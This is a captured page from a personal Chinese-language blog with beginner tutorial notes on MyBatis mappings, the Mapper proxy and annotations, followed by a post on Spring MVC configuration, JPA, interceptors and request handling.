+<p>#{}： 占位符,该符号接收输入参数,花括号中编写参数名称来接收对应参数。当#{}接收简单类型时可用value或者其他名称来获取。<br>${}：表示拼接符,可在原有SQL语句上拼接新的符合SQL语法的语句。            </p>
+<p>MyBatis使用场景:通过上面的入门程序,MyBatis的特点就是以Sql语句为核心的不完全的ORM(关系型映射)框架。使用场景为:对SQL语句优化要求比较高,项目需求经常变动。            </p>
+<h3 id="MyBatis深入学习"><a href="#MyBatis深入学习" class="headerlink" title="MyBatis深入学习"></a>MyBatis深入学习</h3><h4 id="编写日志输出环境配置文件"><a href="#编写日志输出环境配置文件" class="headerlink" title="编写日志输出环境配置文件"></a>编写日志输出环境配置文件</h4><h4 id="MyBatis高级映射"><a href="#MyBatis高级映射" class="headerlink" title="MyBatis高级映射"></a>MyBatis高级映射</h4><h5 id="一对一查询"><a href="#一对一查询" class="headerlink" title="一对一查询"></a>一对一查询</h5><p>查询number对应的学生姓名。<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-22.23.40.15-image.png" alt="2019-01-22.23.40.15-image.png"></p>
+<h6 id="使用resultType-只能映射到一个确定的Java包装类"><a href="#使用resultType-只能映射到一个确定的Java包装类" class="headerlink" title="使用resultType    (只能映射到一个确定的Java包装类)"></a>使用resultType    (只能映射到一个确定的Java包装类)</h6><p>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
+<pre><code>  &lt;mappers&gt;
+    &lt;mapper resource=&quot;com/test/pojo/Student.xml&quot;/&gt;
+&lt;/mappers&gt;
+</code></pre><p>2.Student.xml            </p>
+<pre><code>&lt;select id=&quot;findStudentByCard&quot; parameterType=&quot;_int&quot; resultType=&quot;Student&quot;&gt;
+  SELECT
+    student.*,
+    card.*
+  FROM
+    student,card
+  WHERE student.card_id = card.id AND card.number = #{value}
+&lt;/select&gt;
+</code></pre><h6 id="使用-resultMap-实现"><a href="#使用-resultMap-实现" class="headerlink" title="使用 resultMap 实现"></a>使用 resultMap 实现</h6><p>使用resultMap可以将数据字段映射到名称不一样的响应实体类属性中,重要的是可映射到实体类包裹的其他实体类。<br>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
+<pre><code>  &lt;mappers&gt;
+    &lt;mapper resource=&quot;com/test/pojo/Student.xml&quot;/&gt;
+&lt;/mappers&gt;
+</code></pre><p>2.创建一个新的实体类(包含Student与card)<br>StudentWithCard.java </p>
+<pre><code>package com.test.pojo;
+  public class StudentWithCard {
+    Student student;
+    int number;
+    int id;
+
+      //geter and seter
+  }
+</code></pre><p>3.Student.xml</p>
+<pre><code>&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;
+&lt;select id=&quot;findStudentByCard&quot; parameterType=&quot;_int&quot; resultMap=&quot;StudentInfoMap&quot;&gt;
+  SELECT
+    student.*,
+    card.*
+  FROM
+    student,card
+  WHERE student.card_id = card.id AND card.number = #{value}
+&lt;/select&gt;
+
+&lt;resultMap id=&quot;StudentInfoMap&quot; type=&quot;StudentWithCard&quot;&gt;
+&lt;!-- id 标签表示对应的主键
+     column 对应查询结果的列值
+     property 对应封装类中的属性名称
+--&gt;
+      &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;
+      &lt;result column=&quot;number&quot; property=&quot;number&quot;/&gt;
+      &lt;!-- association 表示关联的嵌套结果，
+           可以简单理解就是为封装类指定的标签
+           --&gt;
+      &lt;association property=&quot;student&quot; javaType=&quot;Student&quot;&gt;
+        &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;
+        &lt;result column=&quot;name&quot; property=&quot;name&quot;/&gt;
+        &lt;result column=&quot;card_id&quot; property=&quot;card_id&quot;/&gt;
+      &lt;/association&gt;
+&lt;/resultMap&gt;
+&lt;/mapper&gt;
+</code></pre><p>4.测试类(取出number为1111的学生的信息):</p>
+<pre><code>StudentWithCard student = session.selectOne(&quot;findStudentByCard&quot;,1111);
+System.out.println(student.getStudent().getName());
+</code></pre><p>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.11.35.57-image.png" alt="2019-01-23.11.35.57-image.png"></p>
+<h5 id="一对多查询"><a href="#一对多查询" class="headerlink" title="一对多查询"></a>一对多查询</h5><p>查询选修了同一个班级的同学信息<br>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.11.42.33-image.png" alt="2019-01-23.11.42.33-image.png"><br>1.首先更改主配置文件加载的<mappers>的内容:    </mappers></p>
+<pre><code>&lt;mappers&gt;
+  &lt;mapper resource=&quot;com/test/pojo/Class.xml&quot;/&gt;
+&lt;/mappers&gt;
+</code></pre><p>2.创建class实体类    </p>
+<pre><code>package com.test.pojo;
+import java.util.List;
+public class Class {
+    private int id;
+    private String name;
+    private List&lt;Student&gt; students;
+      //geter and seter
+  }
+</code></pre><p>3.映射文件Class.xml            </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE mapper
+        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
+        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;
+
+&lt;mapper namespace=&quot;com.test.pojo&quot;&gt;
+
+    &lt;resultMap id=&quot;Students&quot; type=&quot;Student&quot;&gt;
+        &lt;id column=&quot;student_id&quot; property=&quot;student_id&quot; /&gt;
+        &lt;result column=&quot;name&quot; property=&quot;name&quot; /&gt;
+    &lt;/resultMap&gt;
+
+    &lt;select id=&quot;listStudentByClassName&quot; parameterType=&quot;String&quot; resultMap=&quot;Students&quot;&gt;
+        select student.* from student, class where student.student_id = class.student_id and class.name = #{value}
+    &lt;/select&gt;
+&lt;/mapper&gt;
+</code></pre><p>子元素说明:<br>  id: 设置主键字段与模型属性的映射关系<br>  result: 设置普通字段与模型属性的关系            </p>
+<p>配置属性:<br>  property: 映射到JavaBean的属性名称<br>  column: 数据表的列名或者标签别名<br>  javaType: 一个完整的类名,匹配的是一个JavaBean,MyBatis会自动检测</p>
+<p>4.测试类(输出课程为Java课的学生信息):</p>
+<pre><code>List&lt;Student&gt; students = session.selectList(&quot;listStudentByClassName&quot;,&quot;Java课&quot;);
+for (Student student : students){
+    System.out.println(&quot;ID:&quot;+student.getStudent_id()+&quot;,NAME:&quot;+student.getName());
+}  
+</code></pre><p>  <img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-23.12.28.48-image.png" alt="2019-01-23.12.28.48-image.png"></p>
+<p>结合sql语句与映射文件,就可以很方便的操作数据库        </p>
+<h3 id="Mapper-代理实例编写"><a href="#Mapper-代理实例编写" class="headerlink" title="Mapper 代理实例编写"></a>Mapper 代理实例编写</h3><p>1.Mybatis-config.xml        </p>
+<pre><code>&lt;mappers&gt;
+    &lt;mapper resource=&quot;com/test/pojo/StudentMapper.xml&quot;/&gt;
+&lt;/mappers&gt;
+</code></pre><p>2.StudentMapper.xml        </p>
+<pre><code>  &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE mapper
+        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;
+        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;
+
+&lt;mapper namespace=&quot;com.test.pojo.mapper.StudentMapper&quot;&gt;
+    &lt;!-- 查询学生 --&gt;
+    &lt;select id=&quot;findStudentById&quot; parameterType=&quot;_int&quot; resultType=&quot;com.test.pojo.Student&quot;&gt;
+        SELECT * FROM student WHERE student_id = #{id}
+    &lt;/select&gt;
+    &lt;!-- 增加用户 --&gt;
+    &lt;insert id=&quot;insertStudent&quot; parameterType=&quot;com.test.pojo.Student&quot;&gt;
+        INSERT INTO student(student_id, name) VALUES(#{id}, #{name})
+    &lt;/insert&gt;
+    &lt;!-- 删除用户 --&gt;
+    &lt;delete id=&quot;deleteStudent&quot; parameterType=&quot;_int&quot;&gt;
+        DELETE FROM student WHERE student_id = #{id}
+    &lt;/delete&gt;
+    &lt;!-- 修改用户 --&gt;
+    &lt;update id=&quot;updateStudent&quot; parameterType=&quot;com.test.pojo.Student&quot;&gt;
+        UPDATE student SET name = #{name} WHERE student_id = #{id}
+    &lt;/update&gt;
+&lt;/mapper&gt;
+</code></pre><p>如果需要使用StudentMapper.xml的Mapper代理,需要先定义一个接口,名为StudentMapper,然后新建方法定义,分别对应配置文件的增删改查配置,然后将StudentMapper中的namespace改为接口定义的地方,即可在业务类中使用Mapper代理。<br>3.StudentMapper.java接口类(pojo/mapper/StudentMapper.java)    </p>
+<pre><code>package com.test.pojo.mapper;
+import com.test.pojo.Student;
+public interface StudentMapper {
+
+    // 根据 id 查询学生信息
+    public Student findStudentById(int id) throws Exception;
+
+    // 添加学生信息
+    public void insertStudent(Student student) throws Exception;
+
+    // 删除学生信息
+    public void deleteStudent(int id) throws Exception;
+
+    // 修改学生信息
+    public void updateStudent(Student student) throws Exception;
+}
+</code></pre><p>4.测试类Test.java            </p>
+<pre><code>  package com.test;
+
+import java.io.InputStream;
+import com.test.pojo.Student;
+import com.test.pojo.mapper.StudentMapper;
+import org.apache.ibatis.io.Resources;
+import org.apache.ibatis.session.SqlSession;
+import org.apache.ibatis.session.SqlSessionFactory;
+import org.apache.ibatis.session.SqlSessionFactoryBuilder;
+
+
+
+public class Test {
+
+    public static void main(String[] args) throws Exception {
+        String resource = &quot;mybatis-config.xml&quot;;
+        InputStream inputStream = Resources.getResourceAsStream(resource);
+        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream);
+        SqlSession session=sqlSessionFactory.openSession();
+
+        // 获取Mapper代理
+        StudentMapper studentMapper = session.getMapper(StudentMapper.class);
+
+
+        //执行 Mapper 代理独享的查询方法
+        Student student = studentMapper.findStudentById(1);
+        System.out.println(student.getName());
+
+        //insertStudent
+        Student student1 = new Student();
+        student1.setName(&quot;test_1&quot;);
+        student1.setStudent_id(3);
+        studentMapper.insertStudent(student1);
+
+        //deleteStudent
+        studentMapper.deleteStudent(3);
+
+        //updateStudent
+        Student student2 = new Student();
+        student2.setStudent_id(2);
+        student2.setName(&quot;student_2&quot;);
+        studentMapper.updateStudent(student2);
+
+        session.close();
+    }}
+</code></pre><h3 id="注解开发MyBatis"><a href="#注解开发MyBatis" class="headerlink" title="注解开发MyBatis"></a>注解开发MyBatis</h3><p>依照刚才Mapper的例子:<br>1.我们将StudentMapper.xml的配置的sql语句用注释配置在StudentMapper接口中:</p>
+<pre><code>  public interface StudentMapper {
+
+    // 根据 id 查询学生信息
+    @Select(&quot;SELECT * FROM student WHERE student_id = #{id}&quot;)
+    public Student findStudentById(int id) throws Exception;
+
+    // 添加学生信息
+    @Insert(&quot;INSERT INTO student(student_id, name) VALUES(#{id}, #{name})&quot;)
+    public void insertStudent(Student student) throws Exception;
+
+    // 删除学生信息
+    @Delete(&quot;DELETE FROM student WHERE student_id = #{id}&quot;)
+    public void deleteStudent(int id) throws Exception;
+
+    // 修改学生信息
+    @Update(&quot;UPDATE student SET name = #{name} WHERE student_id = #{id}&quot;)
+    public void updateStudent(Student student) throws Exception;
+}
+</code></pre><p>2.修改mybatis-config.xml(将之前配置的映射注释掉)</p>
+<pre><code>&lt;!-- 映射文件 --&gt;
+&lt;mappers&gt;
+    &lt;!--&lt;mapper resource=&quot;com/test/pojo/StudentMapper.xml&quot;/&gt;--&gt;
+    &lt;mapper class=&quot;com.test.pojo.mapper.StudentMapper&quot;/&gt;
+&lt;/mappers&gt;
+</code></pre><p>3.测试类代码不变,即可运行程序            </p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.jianshu.com/p/c77e3691867d" target="_blank" rel="noopener">https://www.jianshu.com/p/c77e3691867d</a><br><a href="http://how2j.cn/k/mybatis/mybatis-tutorial/1087.html" target="_blank" rel="noopener">http://how2j.cn/k/mybatis/mybatis-tutorial/1087.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/23/Spring_mvc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/23/Spring_mvc/" itemprop="url">ssm基础之Spring MVC</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-23T08:15:41+08:00">
+                2019-01-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>跟着大佬的几篇文章学习了SpringMVC,记录一下。</p>
+</blockquote>
+<p>SpringMVC:<br>springmvc是一个基于mvc的web框架。</p>
+<h4 id="Spring-MVC基本配置"><a href="#Spring-MVC基本配置" class="headerlink" title="Spring MVC基本配置"></a>Spring MVC基本配置</h4><p>1.在web.xml配置入口Servlet    </p>
+<pre><code>&lt;servlet&gt;
+    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt; 
+    &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;
+    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+  &lt;/servlet&gt;
+
+  &lt;servlet-mapping&gt;
+    &lt;servlet-name&gt;mvc-dispatcher&lt;/servlet-name&gt;
+    &lt;url-pattern&gt;/&lt;/url-pattern&gt;
+  &lt;/servlet-mapping&gt;    
+</code></pre><p>Servlet名字为:mvc-dispatcher   uri-pattern为/:拦截所有请求<br>2.SpringMVC的映射配置文件<br>在<code>mvc-dispatcher-servlet.xml</code>,配置SpringMVC的一些Controller的初始化,静态文件的映射策略,视图的配置等,这里只说下视图解析器的相关配置:        </p>
+<pre><code>&lt;!--ViewResolver 视图解析器--&gt;
+&lt;!--用于支持Servlet、JSP视图解析--&gt;
+&lt;bean id=&quot;jspViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
+    &lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot;/&gt;
+    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/pages/&quot;/&gt;
+    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;
+&lt;/bean&gt;
+</code></pre><p>在SpringMVC中,controller会返回一个字符串(jsp名字)。在jspViewResolver的2个属性分别为jsp文件的前缀(/WEB-INF/pages/)与后缀(.jsp),这样在controller里面,如果返回的字符串是index(<code>return &quot;index&quot;</code>),SpringMVC就会找到<code>/WEB-INF/pages/index.jsp</code>文件    </p>
+<p>3.Maven自动导入jar包<br> 既然我们做SpringMVC开发,肯定少不了相关的jar包,但是随着项目增大,原来那种下载包然后导入感觉太麻烦,现在使用Maven就变得简单了。    其实maven的工作原理简单理解就是自动将你需要的jar包下载到本地,然后关联到项目中,所有的包都存储在几个中央仓库里面,需要什么包,就取出什么包<br> pom.xml<br> 重点看<code>&lt;dependencies&gt;</code>标签，将对每个包的需求都看成一个依赖<code>&lt;depedency&gt;</code>,定义在<code>&lt;dependencies&gt;</code>中,在每个<code>&lt;dependencies&gt;</code>中,需要提供jar包的groupid,artifactId和version,我们引入一个junit包的格式:</p>
+<pre><code>  &lt;dependency&gt;
+    &lt;groupId&gt;junit&lt;/groupId&gt;
+    &lt;artifactId&gt;junit&lt;/artifactId&gt;
+    &lt;version&gt;3.8.1&lt;/version&gt;
+    &lt;scope&gt;test&lt;/scope&gt;
+&lt;/dependency&gt;
+</code></pre><p>要引入其他包,查询:<a href="https://mvnrepository.com/" target="_blank" rel="noopener">https://mvnrepository.com/</a><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-15.21.52.56-image.png" alt="2019-01-15.21.52.56-image.png"><br> 在pom.xml中填写<code>&lt;dependencies&gt;</code>标签的内容即可</p>
+<p>4.数据库配置<br>SpringMVC集成Spring Data JPA（由 Hibernate JPA 提供），来进行强大的数据库访问<br>在之前接触MVC模式中,数据库的一张表往往对应着一个JavaBean,在SpringMVC中,这个JavaBean就相当于model,且Idea会自动帮我们生成这些类<br>配置数据库有2种方法,由于刚开始学习,先使用较简单的,直接在<code>mvc-dispatcher-servlet.xml</code>中配置:    </p>
+<pre><code>&lt;bean id=&quot;entityManagerFactory&quot; class=&quot;org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean&quot;&gt;
+        &lt;property name=&quot;persistenceUnitName&quot; value=&quot;defaultPersistenceUnit&quot;/&gt;
+        &lt;property name=&quot;packagesToScan&quot; value=&quot;com.gaussic.model&quot; /&gt;
+        &lt;property name=&quot;jpaVendorAdapter&quot;&gt;
+            &lt;bean class=&quot;org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter&quot;/&gt;
+        &lt;/property&gt;
+        &lt;property name=&quot;jpaProperties&quot;&gt;
+            &lt;props&gt;
+                &lt;prop key=&quot;hibernate.connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.url&quot;&gt;jdbc:mysql://localhost:3306/springdemo?useSSL=false&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.username&quot;&gt;root&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.password&quot;&gt;111111&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.show_sql&quot;&gt;false&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.useUnicode&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.characterEncoding&quot;&gt;UTF-8&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.format_sql&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.use_sql_comments&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.hbm2ddl.auto&quot;&gt;update&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.connection.autoReconnect&quot;&gt;true&lt;/prop&gt;
+                &lt;prop key=&quot;hibernate.dialect&quot;&gt;org.hibernate.dialect.MySQL5Dialect&lt;/prop&gt;
+            &lt;prop key=&quot;connection.autoReconnectForPools&quot;&gt;true&lt;/prop&gt;
+            &lt;prop key=&quot;connection.is-connection-validation-required&quot;&gt;true&lt;/prop&gt;
+
+            &lt;prop key=&quot;hibernate.c3p0.validate&quot;&gt;true&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.connection.provider_class&quot;&gt;org.hibernate.service.jdbc.connections.internal.C3P0ConnectionProvider&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.min_size&quot;&gt;5&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.max_size&quot;&gt;600&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.timeout&quot;&gt;1800&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.max_statements&quot;&gt;50&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.preferredTestQuery&quot;&gt;SELECT 1;&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.testConnectionOnCheckout&quot;&gt;true&lt;/prop&gt;
+            &lt;prop key=&quot;hibernate.c3p0.idle_test_period&quot;&gt;3000&lt;/prop&gt;
+        &lt;/props&gt;
+    &lt;/property&gt;
+&lt;/bean&gt;
+</code></pre><p>修改上面的连接信息,然后使用Persistence工具再进行配置<br>参考:<a href="https://my.oschina.net/gaussik/blog/513444" target="_blank" rel="noopener">https://my.oschina.net/gaussik/blog/513444</a></p>
+<p>5.JPA操作<br>JPA是Java Persistence API的简称,就是定义对数据库的操作。首先新建一个repository包,在repository包中的2个接口:UserRepository，BlogRepository并让其都继承JpaRepository。<br>在JpaRepository中定义了几个简化操作数据库的方法        </p>
+<pre><code>   findAll()：查找表中所有记录；
+findOne(Integer id)：按id来查找某一条记录
+findByXXX(Object xxx)：在这里XXX是一个字段名，根据该字段的值开查找所有记录；
+save()和delete()：添加一条记录以及删除一条记录
+</code></pre><p>除此之外,我们可以在该接口中定义新的方法,如项目中定义的更新用户信息的例子:</p>
+<pre><code>@Repository
+public interface UserRepository extends     JpaRepository&lt;UserEntity, Integer&gt; {
+
+@Modifying      // 说明该方法是修改操作
+@Transactional  // 说明该方法是事务性操作
+// 定义查询
+// @Param注解用于提取参数
+@Query(&quot;update UserEntity us set us.nickname=:qNickname, us.firstName=:qFirstName, us.lastName=:qLastName, us.password=:qPassword where us.id=:qId&quot;)
+public void updateUser(@Param(&quot;qNickname&quot;) String nickname, @Param(&quot;qFirstName&quot;) String firstName,
+                       @Param(&quot;qLastName&quot;) String qLastName, @Param(&quot;qPassword&quot;) String password, @Param(&quot;qId&quot;) Integer id);
+}
+</code></pre><p>然后在controller中使用以下语句更新即可</p>
+<pre><code>userRepository.updateUser(user.getNickname(), user.getFirstName(),
+                user.getLastName(), user.getPassword(), user.getId());
+userRepository.flush();   //刷新
+</code></pre><p>6.SpringMVC 拦截器<br>IndexInterceptor.java            </p>
+<pre><code>package com.interceptor;
+import java.util.Date;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+import org.springframework.web.servlet.ModelAndView;
+import org.springframework.web.servlet.handler.HandlerInterceptorAdapter;
+
+
+
+/*在业务处理器处理请求(controller)之前被调用
+false：从当前拦截器往回执行所有拦截器的afterCompletion()
+true:依次执行,直到preHandle都完成---&gt;controller--&gt;从最后一个往回执行postHandle()---&gt;从最后一个往回执行afterCompletion()*/
+
+
+public class IndexInterceptor extends HandlerInterceptorAdapter {
+
+public boolean preHandle(HttpServletRequest request,
+                             HttpServletResponse response, Object handler) throws Exception {
+
+    System.out.println(&quot;preHandle(), 在访问Controller之前被调用&quot;);
+    return true;
+
+}
+
+
+ //controller之后,view之前        
+public void postHandle(HttpServletRequest request,
+                       HttpServletResponse response, Object handler,
+                       ModelAndView modelAndView) throws Exception {
+    System.out.println(&quot;postHandle(), 在访问Controller之后，访问视图之前被调用,这里可以注入一个时间到modelAndView中，用于后续视图显示&quot;);
+    modelAndView.addObject(&quot;date&quot;,&quot;由拦截器生成的时间:&quot; + new Date());
+}
+
+ //view之后,用于清理资源    
+ public void afterCompletion(HttpServletRequest request,
+                            HttpServletResponse response, Object handler, Exception ex)
+        throws Exception {
+
+    System.out.println(&quot;afterCompletion(), 在访问视图之后被调用&quot;);
+}
+
+}
+</code></pre><p>多定义几个拦截器即可理解其执行顺序:<br>在浏览器访问localhost:8080/index时,控制台打印:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-18.09.59.30-image.png" alt="2019-01-18.09.59.30-image.png"></p>
+<h4 id="Spring-MVC请求流程"><a href="#Spring-MVC请求流程" class="headerlink" title="Spring MVC请求流程"></a>Spring MVC请求流程</h4><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-20.23.10.44-image.png" alt="2019-01-20.23.10.44-image.png"></p>
+<p>1.首先,请求离开浏览器后,第一步到达DispatcherServlet,拦截请求并发送给相应的Spring MVC控制器(DispatcherServlet的任务就是拦截请求并发给控制器)<br>2.处理器映射<br>处理器会根据请求携带的url来进行决策请求对应的控制器是哪个,我们配置控制simpleURLHandlerMapping将/hello地址交给helloController处理:</p>
+<pre><code>&lt;bean id=&quot;simpleUrlHandlerMapping&quot;
+      class=&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;&gt;
+    &lt;property name=&quot;mappings&quot;&gt;
+        &lt;props&gt;
+            &lt;!-- /hello 路径的请求交给 id 为 helloController 的控制器处理--&gt;
+            &lt;prop key=&quot;/hello&quot;&gt;helloController&lt;/prop&gt;
+        &lt;/props&gt;
+    &lt;/property&gt;
+&lt;/bean&gt;
+&lt;bean id=&quot;helloController&quot; class=&quot;controller.HelloController&quot;&gt;&lt;/bean&gt;
+</code></pre><p>也可以用注释:</p>
+<pre><code>@Controller
+public class HelloController{
+
+@RequestMapping(value = &quot;/hello&quot;, method = RequestMethod.GET)
+public String hello{
+    //处理逻辑
+    //返回视图名
+}
+</code></pre><p>用了注释就不需要在xml文件中指定controller了,不过需要加上<code>&lt;context:component-scan base-package=&quot;com.controller&quot;/&gt;</code><br>3.控制器处理好相关业务后,将需要返回的数据(Model)和用于渲染输出的视图名(Jsp)返回给DispatcherServlet            </p>
+<pre><code>public String getUsers(ModelMap modelMap) {
+
+    //处理逻辑
+
+    //返回模型数据
+    modelMap.addAttribute(&quot;userList&quot;, userList);
+
+    //返回用于渲染输出的视图名
+    return &quot;admin/users&quot;;
+}
+</code></pre><p>4.视图解析器            </p>
+<pre><code>&lt;bean id=&quot;viewResolver&quot;
+      class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;
+    &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/page/&quot; /&gt;
+    &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot; /&gt;
+&lt;/bean&gt;
+</code></pre><p>这是一个Spring MVC内置的一个视图解析器,该解析器遵循:在controller中返回的视图名上添加前缀和后缀,进而确定一个web应用中视图资源的物理路径。上面的解析器说明需要返回目录webapp/WEB-INF/page/admin下的users.jsp文件                </p>
+<p>5.视图(users.jsp)<br>在视图文件中接收Controller返回的数据(Model)并用于展示    </p>
+<pre><code>&lt;c:forEach items=&quot;${userList}&quot; var=&quot;user&quot;&gt;
+    ${user.id}
+    ${user.nickname}
+    ${user.firstName} ${user.lastName}
+    ${user.password}
+&lt;/c:forEach&gt;
+</code></pre><h4 id="控制器接收请求数据"><a href="#控制器接收请求数据" class="headerlink" title="控制器接收请求数据"></a>控制器接收请求数据</h4><p>1.Servlet原生API        </p>
+<pre><code>@RequestMapping(value = &quot;/admin/login1&quot;, method = RequestMethod.POST)
+public  String loginp1(HttpServletRequest request, HttpServletResponse response){
+    String username1 = request.getParameter(&quot;username1&quot;);
+    String password1 = request.getParameter(&quot;password1&quot;);
+</code></pre><p>2.使用@RequestParam(“前台参数名”)</p>
+<pre><code>@RequestMapping(value = &quot;/admin/login3&quot;, method = RequestMethod.POST)
+public  String loginp3(@RequestParam(&quot;username&quot;) String username3, @RequestParam(&quot;password&quot;) String password3){
+
+    System.out.println(username3);
+    System.out.println(password3);
+    return null;
+}
+</code></pre><p>3.使用同名匹配规则        </p>
+<pre><code>@RequestMapping(value = &quot;/admin/login2&quot;, method = RequestMethod.POST)
+public  String loginp2(String username2,String password2){
+
+    System.out.println(username2);
+    System.out.println(password2);
+    return null;
+}
+</code></pre><p>4.使用模型(model)传参数<br>要求:前台参数名与模型字段名相同。            </p>
+<pre><code>User模型
+package pojo;
+
+public class User {
+
+    String userName;
+    String password;
+
+    /* getter and setter */
+}
+</code></pre><p>在控制器中使用:            </p>
+<pre><code>@RequestMapping(&quot;/login&quot;)
+public String get_(User user){
+    //user.getUsername();
+    //user.getPassword();
+}
+</code></pre><h4 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h4><p>同servlet一样,只对POST方法有效(因为直接处理的request)<br>通过配置SpringMVC的字符编码过滤器来完成,web.xml中添加</p>
+<pre><code>&lt;filter&gt;
+    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
+    &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;
+    &lt;init-param&gt;
+        &lt;param-name&gt;encoding&lt;/param-name&gt;
+        &lt;!-- 设置编码格式 --&gt;
+        &lt;param-value&gt;utf-8&lt;/param-value&gt;
+    &lt;/init-param&gt;
+&lt;/filter&gt;
+&lt;filter-mapping&gt;
+    &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+&lt;/filter-mapping&gt;
+</code></pre><h4 id="控制器回显数据"><a href="#控制器回显数据" class="headerlink" title="控制器回显数据"></a>控制器回显数据</h4><p>1.使用 Servlet 原生 API 来实现    </p>
+<pre><code>@RequestMapping(&quot;/value&quot;)
+public ModelAndView hand(HttpServletRequest request,                              
+HttpServletResponse response) {
+    request.setAttribute(&quot;message&quot;,&quot;成功！&quot;);
+    return new ModelAndView(&quot;test1&quot;);
+}
+</code></pre><p>2.使用 Spring MVC 所提供的 ModelAndView 对象</p>
+<pre><code>@RequestMapping(value = &quot;/admin/login&quot;, method = RequestMethod.GET)
+  public ModelAndView login(HttpRequest request, HttpResponse response){
+      ModelAndView mv = new ModelAndView(&quot;admin/login&quot;);
+      mv.addObject(&quot;message&quot;,&quot;测试&quot;);
+      return mv;
+  }
+</code></pre><p>3.使用 Model 对象(常用)            </p>
+<pre><code>session.setAttribute(&quot;count&quot;,i);
+modelMap.addAttribute(&quot;count&quot;,i);
